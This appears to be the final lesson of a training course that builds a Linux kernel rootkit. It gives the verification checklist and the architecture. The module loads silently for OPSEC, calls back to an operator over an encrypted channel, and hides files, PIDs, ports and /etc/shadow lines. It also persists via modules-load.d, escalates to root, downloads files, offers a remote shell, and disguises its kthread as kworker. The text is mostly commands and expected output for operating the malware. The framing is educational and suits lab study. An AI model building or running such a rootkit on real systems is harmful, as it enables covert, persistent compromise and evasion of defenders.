# Assemble and verify the complete rootkit

This is the final project.
You have built every subsystem across 27 lessons and 6 milestones.
The starter is your M05 solution, fully working.
Run the verification checklist below to confirm every capability end to end.

## Verification checklist

### 1. Key generation

```sh
key=$(openssl rand -hex 32)
echo "$key"
```

Save this key.
You will use it for both loading and connecting.

### 2. Module load

```sh
insmod rklings.ko control_key="$key"
```

Verify: `dmesg | tail` shows nothing from the module.
This is OPSEC.
A rootkit that announces itself in the kernel log is already detected.

### 3. Operator connection

From the operator machine (or localhost for testing):

```sh
./operator --key "$key" --host <target> --port 4444
```

The agent connects OUT to the operator (callback architecture).
The encrypted handshake validates the shared key before any commands are
accepted.

### 4. Basic commands

```text
operator> PING
PONG

operator> INFO
sysname: Linux
nodename: target-vm
release: 7.2.5-4-omarchy
version: #1 SMP ...
machine: x86_64

operator> STATUS
files: 0
pids: 0
contents: 0
ports: 0
cloaked: no
persisted: no
```

### 5. File hiding

```text
operator> HIDE FILE secret.txt
hidden
```

On the target:

```sh
echo "classified" > /tmp/secret.txt
ls /tmp/           # secret.txt is gone
cat /tmp/secret.txt  # still accessible if you know the name
```

```text
operator> LIST FILE
[0] secret.txt

operator> UNHIDE FILE secret.txt
unhidden
```

### 6. PID hiding

```text
operator> HIDE PID 1234
hidden
```

On the target:

```sh
ps aux | grep 1234    # gone from output
```

```text
operator> LIST PID
[0] 1234
```

### 7. Content hiding

```text
operator> HIDE CONTENT password123
hidden
```

On the target:

```sh
cat /etc/shadow    # lines containing "password123" are filtered
```

### 8. Port hiding

```text
operator> HIDE PORT 8080
hidden
```

On the target:

```sh
ss -tlnp | grep 8080    # gone from output
```

### 9. Persistence

```text
operator> PERSIST
persisted
```

On the target:

```sh
cat /etc/modules-load.d/rklings.conf    # contains "rklings"
```

```text
operator> UNPERSIST
unpersisted
```

Verify the file is gone.

### 10. Privilege escalation

```text
operator> ESCALATE
escalated
```

The operator's session now runs with UID 0 capabilities.

### 11. File download

```text
operator> DOWNLOAD /etc/hostname
target-vm
```

Verify the contents match `cat /etc/hostname` on the target.

### 12. Auto-OPSEC verification

While connected:

```sh
ps aux | grep kworker/u8:3    # agent kthread is hidden
ss -tlnp | grep 4444          # connection port is hidden
```

Disconnect the operator, then:

```sh
ps aux | grep kworker/u8:3    # kthread reappears
ss -tlnp | grep 4444          # port reappears
```

### 13. Network traffic analysis

```sh
tcpdump -i lo port 4444 -X
```

All captured data is encrypted (AES-256-GCM).
No plaintext commands or responses are visible in the packet capture.

### 14. Clean unload

```sh
rmmod rklings
```

Verify:

- No kernel faults in dmesg
- All hidden entries are restored
- Module is removed from lsmod
- Socket is released
- Kthread is stopped
- Sensitive memory is zeroed

## Architecture summary

```text
insmod rklings.ko control_key=<hex>
    |
    +-- parse key, zero parameter
    +-- init target lists, kretprobes, shell subsystem
    +-- spawn agent kthread (disguised as kworker/u8:3)
    |
    +-- agent loop:
         |
         +-- rk_connect() to operator (callback, exponential backoff)
         +-- AEAD handshake (HELLO exchange)
         +-- auto-hide kthread PID + connection port
         +-- recv/decrypt/dispatch loop:
         |     |
         |     +-- PING, INFO, STATUS
         |     +-- LIST FILE/PID/CONTENT/PORT
         |     +-- HIDE/UNHIDE FILE/PID/CONTENT/PORT
         |     +-- PERSIST/UNPERSIST
         |     +-- ESCALATE
         |     +-- DOWNLOAD <path>
         |     +-- SHELL, EXEC <cmd>
         |     +-- CLOAK/UNCLOAK
         |
         +-- auto-unhide PID + port
         +-- crypto_free_aead, sock_release
         +-- retry with backoff

rmmod rklings
    |
    +-- restore module visibility
    +-- stop kthread
    +-- shutdown + release socket
    +-- unregister kretprobes
    +-- zero key material
```

## Your task

Your starter is the complete, working M05 solution.
Review the code, understand every subsystem, then run the full checklist.
If any check fails, trace the issue through the code and fix it.

Run:

```sh
./rklings check
```
